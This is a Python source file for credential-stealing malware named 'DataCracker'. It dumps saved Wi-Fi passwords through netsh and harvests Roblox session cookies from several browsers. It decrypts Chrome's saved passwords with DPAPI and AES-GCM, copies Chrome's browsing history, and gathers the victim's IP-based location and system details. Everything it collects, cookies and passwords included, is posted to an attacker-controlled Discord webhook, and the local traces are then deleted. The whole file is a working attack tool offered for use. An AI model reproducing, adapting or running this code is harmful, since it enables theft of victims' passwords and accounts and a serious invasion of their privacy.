import discord
import discord_webhook
import subprocess
from datetime import datetime, timedelta
import requests
import platform
import socket
import getpass
import os
import browser_cookie3
import robloxpy
import json
import time
import re
import sys
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import secret
from secret import webhookurl
import os
# print("Started")

wurl = webhookurl

try:
    current_time = datetime.now()
    formatted_time = current_time.strftime(
        "%d-%m-%Y--%H;%M;%S")  # 24-hour format
    # print(formatted_time)
except:
    None

failed = 0
failedintotal = 0
foundcookies = 0
cookiedata = []


def format_table_row(label, value):
    row_format = "{:<36} | {:<}"
    return row_format.format(label, value)


try:
    profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', 'key=clear']).decode(
        'cp850', errors='backslashreplace').split('\n')
    gotprofile1 = "True"
except:
    gotprofile1 = "False"

try:
    output_data = []
    for profile in profiles:
        failed = 0
        profile_parts = profile.split(':')

        if len(profile_parts) > 1:
            profile_name = profile_parts[1].strip()
        else:
            profile_name = None
        # print(f"Profile Name: {profile_name}")

        if profile_name is not None and profile_name != "":
            password_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', f'name={profile_name}', 'key=clear']).decode(
                'cp850', errors='backslashreplace').split('\n')

            password = ''
            for line in password_info:
                # print(line)
                if "Schlüsselinhalt" in line:
                    # print(line)
                    line_parts = line.split(':')
                    if len(line_parts) > 1:
                        password = line_parts[1].strip()
                        output_data.append((profile_name, password, failed))
                    else:
                        password = "Password not found."
                else:
                    failed += 1
                    failedintotal += 1
                    None
    gotprofiledata = "True"

except:
    gotprofiledata = "False"


try:
    response = requests.get('https://ipinfo.io')
    ipdata = response.json()
    gotipinfo = "True"
except:
    gotipinfo = "False"


try:
    # Operating System information
    os_name = platform.system()
    os_version = platform.release()
    # Hostname and IP Address
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    # Username
    usernamepc = getpass.getuser()
    # Computer Name (Windows only)
    if os_name == 'Windows':
        computer_name = os.environ['COMPUTERNAME']
    else:
        computer_name = 'N/A'
    gotsysteminfo = "True"
except:
    gotsysteminfo = "False"


try:
    def getCookiesFromDomain(domain, cookieName, browserCookies):
        global cookiedata

        for cookie in browserCookies:
            if domain in cookie.domain:
                if cookie.name in cookieName:
                    try:
                        found_cookie_value = cookie.value
                        # Überprüfe, ob das gefundene Cookie gültig ist
                        isvalid = robloxpy.Utils.CheckCookie(
                            found_cookie_value)
                        if isvalid == "Valid Cookie":
                            isvalid = "Valid"
                            # Rufe Benutzerinformationen ab
                            ebruh = requests.get(
                                "https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": found_cookie_value})
                            info = json.loads(ebruh.text)
                            rid = info["UserID"]
                            rap = robloxpy.User.External.GetRAP(rid)
                            friends = robloxpy.User.Friends.External.GetCount(
                                rid)
                            age = robloxpy.User.External.GetAge(rid)
                            dnso = None
                            crdate = robloxpy.User.External.CreationDate(rid)
                            rolimons = f"https://www.rolimons.com/player/{rid}"
                            roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
                            headshot = robloxpy.User.External.GetHeadshot(rid)
                            username = info['UserName']
                            robux = info['RobuxBalance']
                            premium = info['IsPremium']

                            # Füge die Benutzerdaten zu cookiedata hinzu
                            cookiedata.append(
                                (found_cookie_value, username, roblox_profile, crdate, age, robux, premium))

                            # print(cookiedata)
                    except Exception as e:
                        print("Fehler beim Verarbeiten des Cookies:", str(e))
except Exception as e:
    print("Fehler beim Ausführen des Codes:", str(e))

try:
    try:
        getCookiesFromDomain("roblox.com", ".ROBLOSECURITY",
                             browser_cookie3.chrome())
        time.sleep(0.2)
    except:
        None
    try:
        getCookiesFromDomain("roblox.com", ".ROBLOSECURITY",
                             browser_cookie3.opera())
        time.sleep(0.2)
    except:
        None
    try:
        getCookiesFromDomain("roblox.com", ".ROBLOSECURITY",
                             browser_cookie3.edge())
        time.sleep(0.2)
    except:
        None
    try:
        getCookiesFromDomain("roblox.com", ".ROBLOSECURITY",
                             browser_cookie3.firefox())
        time.sleep(0.2)
    except:
        None
    askedforcookies = "True"
except:
    askedforcookies = "False"

# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# Chrome Passwords


# GLOBAL CONSTANT
CHROME_PATH_LOCAL_STATE = os.path.normpath(
    r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(
    r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

passwords = []  # Liste zur Speicherung der Passwörter


def get_secret_key():
    try:
        # (1) Get secretkey from chrome local state
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Remove suffix DPAPI
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(
            secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None


def decrypt_password(ciphertext, secret_key):
    try:
        # (3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        # Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        # (4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""


def write_passwords_to_txt(passwords, filename):
    try:
        with open(filename, 'w', encoding='utf-8') as txt_file:
            txt_file.write("------------------------------------------------------------------------------------------------------------------------------------\n                                                    Passwords\n------------------------------------------------------------------------------------------------------------------------------------\n\n")
            for password in passwords:
                txt_file.write(f"Sequence: {password['index']}\n")
                txt_file.write(f"URL: {password['url']}\n")
                txt_file.write(f"User Name: {password['username']}\n")
                txt_file.write(f"Password: {password['password']}\n")
                txt_file.write("*" * 50 + "\n")
        # print(f"Die Passwörter wurden in die Datei '{filename}' geschrieben.")
    except Exception as e:
        print(f"Fehler beim Schreiben der Passwörter in die Datei: {str(e)}")


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome database cannot be found")
        return None


try:
    # (1) Get secret key
    secret_key = get_secret_key()
    # Search user profile or default folder (this is where the encrypted login password is stored)
    folders = [element for element in os.listdir(
        CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
    for folder in folders:
        # (2) Get ciphertext from sqlite database
        chrome_path_login_db = os.path.normpath(
            r"%s\%s\Login Data" % (CHROME_PATH, folder))
        conn = get_db_connection(chrome_path_login_db)
        if (secret_key and conn):
            cursor = conn.cursor()
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for index, login in enumerate(cursor.fetchall()):
                url = login[0]
                username = login[1]
                ciphertext = login[2]
                if (url != "" and username != "" and ciphertext != ""):
                    # (3) Filter the initialisation vector & encrypted password from ciphertext
                    # (4) Use AES algorithm to decrypt the password
                    decrypted_password = decrypt_password(
                        ciphertext, secret_key)
                    # print("Sequence: %d" % (index))
                    # print("URL: %s\nUser Name: %s\nPassword: %s\n" %
                    #      (url, username, decrypted_password))
                    # print("*"*50)
                    # (5) Speichern in der Liste 'passwords'
                    passwords.append({
                        "index": index,
                        "url": url,
                        "username": username,
                        "password": decrypted_password
                    })

    # Schreibe die Passwörter in eine Textdatei
    write_passwords_to_txt(passwords, 'passwords.txt')
    gotpw = True

except Exception as e:
    print("[ERR] %s" % str(e))
    gotpw = False


# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# Chrome Search History

try:
    chrome_history_path = os.path.expanduser(
        '~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'

    # Create a copy of the Chrome history database to avoid locking issues
    temp_history_path = 'temp_history'
    shutil.copyfile(chrome_history_path, temp_history_path)

    # Connect to the Chrome history database
    conn = sqlite3.connect(temp_history_path)
    cursor = conn.cursor()

    # Execute a query to retrieve the browsing history
    cursor.execute(
        "SELECT title, url, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC")

    # Create and open a text file for writing
    output_file = open('chrome_history.txt', 'w', encoding='utf-8')

    # Add header and separator lines to the text file
    output_file.write(
        "------------------------------------------------------------------------------------------------------------------------------------\n")
    output_file.write(
        "                                              Chrome Search History\n")
    output_file.write(
        "------------------------------------------------------------------------------------------------------------------------------------\n\n")

    # Fetch and write the results to the text file
    results = cursor.fetchall()
    for row in results:
        title, url, visit_count, last_visit_time = row
        formatted_time2 = datetime(1601, 1, 1) + \
            timedelta(microseconds=last_visit_time)

        output_file.write(f"Title: {title}\n")
        output_file.write(f"URL: {url}\n")
        output_file.write(f"Visit Count: {visit_count}\n")
        output_file.write(
            f"Last Visit Time: {formatted_time2.strftime('%Y-%m-%d %H:%M:%S')}\n\n")

    # Close the text file
    output_file.close()

    # Close the database connection
    conn.close()

    # Clean up the temporary copy of the Chrome history database
    os.remove(temp_history_path)
    gotchromehistory = True
    print(gotchromehistory)
except:
    gotchromehistory = False
    print(gotchromehistory)

# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------
# --------------------------------------------------------------------------------------------------------------------------------------------------


try:
    with open(f'{formatted_time}.txt', 'w') as f:
        try:
            f.write("------------------------------------------------------------------------------------------------------------------------------------\n                                          DataCracker by LennyMaxMine\n------------------------------------------------------------------------------------------------------------------------------------\n\n")
        except:
            None
        try:
            f.write(format_table_row("Time on Input", formatted_time) + "\n")
            f.write(format_table_row("Got Profiles", gotprofile1) + "\n")
            f.write(format_table_row(
                "Got Profiles Passwords", gotprofiledata) + "\n")
            f.write(format_table_row("Got IP-Address Infos", gotipinfo) + "\n")
            f.write(format_table_row("Got SYSTEM-INFO", gotsysteminfo) + "\n")
            f.write(format_table_row(
                "Successfully asked for Cookies", askedforcookies) + "\n")
            f.write(format_table_row("Got Chrome Passwords", gotpw) + "\n")
            f.write(format_table_row(
                "Got Chrome Search History", gotchromehistory) + "\n")
        except:
            f.write("Couldn't gather Info over Checks.\n\n")

        f.write("\n")
        f.write("------------------------------------------------------------------------------------------------------------------------------------\n                                                      WIFI\n------------------------------------------------------------------------------------------------------------------------------------\n\n")
        try:
            for data in output_data:
                profile_name, password, failed = data
                f.write("SSID: {:<30} | Password: {:<50} | Failed Times: {:<}\n".format(
                    profile_name, password, failed))

            f.write("\nFailed times in total: {}\n\n\n".format(failedintotal))
        except:
            f.write("Couldn't gather Info over Wifi.\n\n")

        f.write("------------------------------------------------------------------------------------------------------------------------------------\n                                                   IP-ADDRESS\n------------------------------------------------------------------------------------------------------------------------------------\n\n")
        try:
            f.write(format_table_row(
                "IP Address (Request)", ipdata['ip']) + "\n")
            f.write(format_table_row("IP Address (OS)", ip_address) + "\n")
            f.write(format_table_row("Hostname", ipdata['hostname']) + "\n")
            f.write(format_table_row("City", ipdata['city']) + "\n")
            f.write(format_table_row("Region", ipdata['region']) + "\n")
            f.write(format_table_row("Country", ipdata['country']) + "\n")
            f.write(format_table_row(
                "Latitude and Longitude", ipdata['loc']) + "\n")
            f.write(format_table_row("Google Earth",
                    f"https://www.google.de/maps/place/{ipdata['loc']}\n"))
            f.write(format_table_row("Postal Code", ipdata['postal']) + "\n")
            f.write(format_table_row("Timezone", ipdata['timezone']) + "\n")
            f.write(format_table_row(
                "Internet Service Provider", ipdata['org']) + "\n")
            f.write("\n")

        except:
            f.write("Couldn't gather Info over IP-Address.\n\n")

        f.write("------------------------------------------------------------------------------------------------------------------------------------\n                                                    SYSTEM-INFO\n------------------------------------------------------------------------------------------------------------------------------------\n\n")
        try:
            f.write(format_table_row("Operating System", os_name) + "\n")
            f.write(format_table_row("Version", os_version) + "\n")
            f.write(format_table_row("Hostname", hostname) + "\n")
            f.write(format_table_row("Username", username) + "\n")
            f.write(format_table_row("Computer Name", computer_name) + "\n\n")
        except:
            f.write("Couldn't gather Info over System-Info.\n\n")

        f.write("------------------------------------------------------------------------------------------------------------------------------------\n                                                      ROBLOX\n------------------------------------------------------------------------------------------------------------------------------------\n\n")
        try:

            # def format_table_row(label, value):
            # row_format = "{:<36} | {:<}"
            # return row_format.format(label, value)
            def format_table_row2(label, value):
                return f"{label:<15} | {value}\n"

            for info in cookiedata:
                found_cookie_value, username, roblox_profile, crdate, age, robux, premium = info
                f.write(format_table_row2("Cookie Value", found_cookie_value))
                f.write(format_table_row2("Username", username))
                f.write(format_table_row2("Roblox Profile", roblox_profile))
                f.write(format_table_row2("crdate", crdate))
                f.write(format_table_row2("Age", age))
                f.write(format_table_row2("Robux", robux))
                f.write(format_table_row2("Premium", premium))

        except Exception as e:
            print("Fehler beim Ausführen des Codes:", str(e))

        f.write("\n\nEND")
except:
    None


# with open(f'test.txt', 'w') as f:
#    f.write("YESYESYES\n\n")
#    for info in cookiedata:
#        f.write("Cookies\n")
#        username, roblox_profile, crdate, age, robux, premium = info
#        f.write("Username: {:<34} | Roblox Profile: {:<10} | Age: {:5} | Robux: {:6} | Premium: {:7}\n".format(
#            username, roblox_profile, age, robux, premium))
#        f.write("Cookies\n")

try:
    def emojitof(Input):
        if Input is True:
            return ":white_check_mark:"
        elif Input == "True":
            return ":white_check_mark:"
        else:
            return ":x:"
    webhook_data = {
        "content": "@everyone",
        "color": 6749952,
        "embeds": [
            {
                "title": "New Hit!",
                "color": None,
                "fields": [
                    {
                        "name": "Got Wifi Profiles",
                        "value": emojitof(gotprofile1),
                        "inline": True
                    },
                    {
                        "name": "Got Wifi Profiles Passwords",
                        "value": emojitof(gotprofiledata),
                        "inline": True
                    },
                    {
                        "name": "Got IP-Address Infos",
                        "value": emojitof(gotipinfo),
                        "inline": True
                    },
                    {
                        "name": "Asked for Cookies",
                        "value": emojitof(askedforcookies),
                        "inline": True
                    },
                    {
                        "name": "Got System Infos",
                        "value": emojitof(gotsysteminfo),
                        "inline": True
                    },
                    {
                        "name": "Got Chrome Passwords",
                        "value": emojitof(gotpw),
                        "inline": True
                    },
                    {
                        "name": "Got Chrome Search History",
                        "value": emojitof(gotchromehistory),
                        "inline": True
                    }
                ],
                "author": {
                    "name": "By LennyMaxMine - DataCracker"
                },
                "footer": {
                    "text": "On: " + str(formatted_time)
                }
            },
        ],
        "attachments": []
    }

    # Konvertiere JSON-Daten in einen String
    webhook_json = json.dumps(webhook_data)

    # Sende den POST-Request an den Webhook
    response = requests.post(wurl, data=webhook_json, headers={
                             'Content-Type': 'application/json'})

except Exception as e:
    print("Fehler beim Ausführen des Codes (Webhook):", str(e))

try:
    webhook_data = {
        "username": "DataCracker Bot",
        "avatar_url": "https://example.com/avatar.png",
        "embeds": [
            {
                "title": "DataCracker - By LennyMaxMine",
                "content": "@everyone",
                "color": 16711680,
                "fields": [
                    {
                        "name": ":computer: IP Address (Request)",
                        "value": ipdata['ip'],
                        "inline": True
                    },
                    {
                        "name": ":computer: IP Address (OS)",
                        "value": ip_address,
                        "inline": True
                    },
                    {
                        "name": ":computer: Hostname",
                        "value": ipdata['hostname'],
                        "inline": True
                    },
                    {
                        "name": ":cityscape: City",
                        "value": ipdata['city'],
                        "inline": True
                    },
                    {
                        "name": ":computer: Region",
                        "value": ipdata['region'],
                        "inline": True
                    },
                    {
                        "name": ":flag_white: Country",
                        "value": ipdata['country'],
                        "inline": True
                    },
                    {
                        "name": ":earth_americas: Latitude and Longitude",
                        "value": ipdata['loc'],
                        "inline": True
                    },
                    {
                        "name": ":earth_americas: Google Earth",
                        "value": "https://www.google.de/maps/place/" + ipdata['loc'],
                        "inline": True
                    },
                    {
                        "name": ":earth_americas: Postal Code",
                        "value": ipdata['postal'],
                        "inline": True
                    },
                    {
                        "name": ":watch: Timezone",
                        "value": ipdata['timezone'],
                        "inline": True
                    },
                    {
                        "name": ":globe_with_meridians: Internet Service Provider",
                        "value": ipdata['org'],
                        "inline": True
                    },
                    {
                        "name": ":computer: Operating System",
                        "value": os_name,
                        "inline": True
                    },
                    {
                        "name": ":desktop_computer: Version",
                        "value": os_version,
                        "inline": True
                    },
                    {
                        "name": ":desktop_computer: Hostname",
                        "value": hostname,
                        "inline": True
                    },
                    {
                        "name": ":bust_in_silhouette: Username",
                        "value": usernamepc,
                        "inline": True
                    },
                    {
                        "name": ":computer: Computer Name",
                        "value": computer_name,
                        "inline": True
                    }
                ]
            }
        ]
    }

    # Konvertiere JSON-Daten in einen String
    webhook_json = json.dumps(webhook_data)

    # Sende den POST-Request an den Webhook
    response = requests.post(wurl, data=webhook_json, headers={
                             'Content-Type': 'application/json'})

except Exception as e:
    print("Fehler beim Ausführen des Codes (Webhook2):", str(e))


def send_file_to_discord_webhook(webhook_url, file_path):
    try:
        with open(file_path, 'rb') as file:
            payload = {
                'file': file
            }
            response = requests.post(webhook_url, files=payload)

        # if response.status_code == 200:
        # print('File sent successfully.')
        # else:
        # print('Failed to send the file. Status code:', response.status_code)
        os.remove(file_path)
    except:
        os.remove(file_path)


try:
    webhook_url = wurl
    file_path = f'./{formatted_time}.txt'
    send_file_to_discord_webhook(webhook_url, file_path)
except:
    None

try:
    webhook_url = wurl
    file_path = f'./passwords.txt'
    send_file_to_discord_webhook(webhook_url, file_path)
except:
    None

try:
    webhook_url = wurl
    file_path = f'./chrome_history.txt'
    send_file_to_discord_webhook(webhook_url, file_path)
except:
    None


# -----------------------------


try:
    os.remove(f'./Loginvault.db')
except:
    None
